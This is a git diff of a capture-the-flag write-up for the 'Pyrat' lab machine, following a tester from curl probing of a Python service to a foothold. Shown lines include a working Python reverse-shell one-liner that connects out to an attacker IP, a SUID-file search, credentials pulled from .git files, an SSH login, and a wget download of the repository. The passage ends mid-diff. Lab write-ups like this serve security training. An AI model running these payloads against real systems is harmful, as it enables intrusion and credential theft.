@@ -41,7 +41,7 @@ PORT     STATE SERVICE  VERSION
 ```
 curl 'http://10.10.253.61:8000/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i'
 ``
-</br> still telling us to try something more basic
+</br> still telling us to try something more basic.
 </br> trim away all header information, just make it blank, is that "more basic" ?
 ```
  curl 'http://pyrat.thm:8000/' -H 'User-Agent:' -H 'Accept:' -H 'Accept-Language:' -H 'Accept-Encoding:' -H 'Connection:' -H 'Upgrade-Insecure-Requests:' -H 'Host:--http0.9'
@@ -55,7 +55,7 @@ curl 'http://10.10.253.61:8000/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux
 </br> What is simpler than getting data by curl?
 </br> a net-cat to that port? Since that's a simple connection?
 </br> I saw on the nmap -A scan that the 8000 port is running python... so I try an f-string to see if python3 is indeed running, and it seems so.
-</br> let's try writing a python reverse shell
+</br> let's try writing a python reverse shell (just prepping this code prior to pumping it in that input vector)
 ```
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.200.159",1776));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
 ```
@@ -76,29 +76,36 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 </br>boot up the session with that whole 3-ring circus again, and see what perms I got with `find / -perm -4000 2>/dev/null` but nothing is out of the ordinary.
 </br>move to /tmp because I should at least be able to write stuff from there. 
 </br>Wait, there's stuff in temp?
+![garboNoCrontab](https://github.com/user-attachments/assets/3c979ec4-5ee7-48d8-b055-d5dbf4b120dd)
 
-can't open...
+</br> can't open those files, and crontab is denied too
+![cantReadCrontabNull](https://github.com/user-attachments/assets/3652ba13-f972-4b23-ba12-706b3fc012da)
 
-check other standard area /opt
-there's /opt/dev with a .git collection? Is this guy a coder with a github repo?
+</br> Brick wall... change approach to enumerate files on the system we got a reverse shell on
+</br> check other standard area /opt
+</br>  there's /opt/dev with a .git collection? Is our target guy a coder with a github repo?
+![wandersoing3](https://github.com/user-attachments/assets/620c5b5b-e76f-44b6-ba4f-624f64fbdb45)
+</br>Credential leak found in .git files within /opt/dev !
+</br>read through the config and we get credentials, we can now ssh
+![moreDetailed3234](https://github.com/user-attachments/assets/173bf650-1fbc-43f9-b4b6-dd7b2f78c86c)
 
-read through the config and we get credentials, we can now ssh
+</br>ssh think@<ip>
+</br>use the password we found; this givs us the user flag, btw
+![immediatelyUsePass](https://github.com/user-attachments/assets/05675275-ca2b-4dec-a1f8-a2cf99c076fe)
 
-ssh think@<ip>
-use the password we found
-(simpler connection to target machine as the user "think")
+</br> Dead end, trying to do a breakout with a sudo call got incident reported
+</br> maybe DON'T do this on an engagement?
+![kekThatsGarbage3](https://github.com/user-attachments/assets/50529a7a-f508-4305-871a-22db4fa02f32)
 
-I wanna get this .git repo, so set up a pythons erver:
+</br> I wanna get this .git repo. It should be a collection of files, so I set up a python server:
 
-python3 -m http.server 1812
-Serving HTTP on 0.0.0.0 port 1812 (http://0.0.0.0:1812/) ...
-(as usual, the port, 1812, is arbitrary)
+</br>`python3 -m http.server 1812`
+</br>`Serving HTTP on 0.0.0.0 port 1812 (http://0.0.0.0:1812/) ...`
+</br>(as usual, the port, 1812, is arbitrary)
+</br>then download it all with a wget request from another terminal
+</br>`wget -r http://10.10.253.61:1812`
 
-then download it all with a wget request
-
-wget -r http://10.10.253.61:1812
-
-I'm stupid and saved the git repo as the ip address and 1812 port number as the dir name....
+</br> I'm stupid and saved the git repo as the ip address and 1812 port number as the dir name....
 
 critical error:
 ```Changes not staged for commit:
